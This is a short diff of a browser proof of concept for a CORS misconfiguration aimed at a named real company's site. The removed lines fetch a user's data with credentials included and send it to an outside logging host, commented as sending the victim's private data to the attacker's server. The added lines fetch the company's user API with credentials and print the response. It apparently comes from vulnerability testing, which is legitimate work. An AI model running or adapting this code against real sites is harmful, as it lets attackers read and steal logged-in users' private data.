@@ -1,6 +1,8 @@
-fetch("https://github.com/justeattakeaway", {credentials: "include"})
-  .then(response => response.json())
-  .then(data => {
-    // Send the victim's private data to the attacker's server
-    fetch("https://corsvulner.vercel.app//log?data=" + JSON.stringify(data));
-  });
+<script>
+fetch("https://justeattakeaway.com/api/user", {
+  credentials: "include"
+})
+.then(r => r.text())
+.then(console.log)
+.catch(console.error);
+</script>
